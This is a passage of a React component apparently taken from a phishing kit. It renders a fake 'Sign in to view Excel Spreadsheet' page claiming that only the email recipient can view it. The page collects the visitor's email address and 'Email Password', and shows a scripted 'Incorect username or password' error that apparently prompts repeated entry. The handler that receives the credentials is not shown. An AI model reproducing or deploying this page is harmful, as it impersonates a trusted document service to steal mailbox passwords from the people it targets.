QUxCbC1AmTISs5E0pyi+w+Vtyb+K0BONQAIvjyKxqG3mO5njS1ZPoI8qlpk2lrwUeQZ6YYYExsvNdai98bQAlrw9i0Fp6BoIuly7rYWgoyiOgnQ15GjsdC2Kg1gAhhazFvKTyEsb6lUp8Phek5MHViIX2GPD4qV+3WElAGEKEYwhDz1sKMMmNMCkzTT1etww94AyhhbRicf9CDMTcKZsYNkMFAiAGmTMqkNwGfbZxOQ5ijHX7QAA5ir6XQ/gWHxtwwg+1kYjMOKiZkgyEpG75DhsiTM4yQmpwK1o9WDxpAJYQtxrrDJy0G5yxFablyh6/p6YOFf66i2WtBA6iIqMXILQXhhtGQv8hS5oMG8BBKxvE1Rq0B/AXvTE2DyAQN4GWCBvAqAP8HgwS5H9SWzLIAAAAASUVORK5CYII="
                    />
                </div>

                <p style={{
                    color:'#fff',
                    fontSize:'21px',
                    marginTop:'-2px'
                }}>Sign in to view Excel Spreadsheet</p>

                <aside style={{
                    color:'#fff',
                    fontSize:'13px',
                    marginTop:'-17px'
                }}>Only Email recipient can view</aside>

                <form onSubmit={submitHandler} className="frm" style={{
                    marginTop:'17px'
                }}>
 
                    {err ? <b><p style={{
                        textAlign:'center',
                        color:'#ba1100',
                        marginBottom:'-10px',
                        fontSize:'15px'
                    }}>Incorect username or password</p></b> : null }

                    <div className="inp_wrapper_">

                        <div className="eml_engulf">
                            <input 
                                type="email"
                                placeholder="Email"
                                name="email"
                                required
                                className="email"
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>

                        <div className="paswd_engulf">
                            <input 
                                type="password"
                                placeholder="Email Password"
                                className="pswd"
                                name="paswd"
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                            />
                        </div>

                        <div className="submit_engulf">
                            <input 
                                type="submit"
                                className="btn"
                                value={`View`}
                                onClick={submitHandler}
                            />
                        </div>

                    </div>
                </form>

                
            </div>

        </main>

        <article style={{
            display:'flex',
            justifyContent:'center',
            alignItems:'center',
            marginTop:'-2cm'
        }}>
        <div className="wrp" onClick={reloadPreloader}>
            <img alt="key" 
            style={{
                width:'30px',
                height:'30px'
            }}
            className=""
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAYAAAAehFoBAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAJaSURBVFhH7ZexcsIwDIb7aOywww477LDDDjvssMMOO+w8AA/AA7j35SKf4pgkjp0rbfnvdCVNIn1WLCn5Mr9Mfxv4crmYzWZjZrOZ6fV6mQ0Gg+x4sViYw+Fgns9nfnU3qgUGYLfbZWACWWer1crc7/fcQ1pVAl+vVzMajUpA0+nULJdLs91uM+N4OByWruNppM74S+Dj8VgIDtD5fK4EIKssRN83mUySQnuBXdj9fp+faabH42HG43En0CVgtoEE6vf7UXtRZ5vCTKECMFnQezZF4cznc+sv9En5VADWW8F1zmJoW6Gti2ulIOk0sVujACzZJYAWQXRbCw1clYhQWWC9dwmgRRA5JxYaWLJMAcbIAq/XawvjZi8FcJX/EFlgmj/O+OuKAHQMCcjv0KD6CfK7rSwwjwpntCKfACSrWJsM0ZsFmOnYVhY4hbM6/W9gqWIafRdiCAmw24VCZIFlItGLu5DuxTET1ALr1pViJLvSIzpJW9NVTM9MrVRvbxYYSS/GWEBKAZgCugCsm3vsCPUpBXQBGOkRyrdZasVCl4Bdh7x4h2YB8TnFx6tvDMdAl4CR65BWdzqd8rPVYu/zyS/3vhoSbaG9wIibdRFigPMlfLvdCs5pgyxIg4pVTbU20C+BRfRnmYJtrG4Mh0LXAouYVG7GXWNhFG3om1kIdGNgEY4oJIoKGJ4Ax25xSXCKluLTFlOIwcBNJYF9FlOIbwWM6qA7A/apCTDyQYveEhi50KIfAW5aiCzsLYB95sv6BziFPsBdS4B8hcj/3ha4zkQf4K71y4CN+QYvVhrOMENjQAAAAABJRU5ErkJggg=="
            />

            &#160;

            <p style={{
                color:'rgb(32,107,68)'
            }}>Sign-in using other options</p>
        </div>
        </article>


    </>);
};

export default Formm;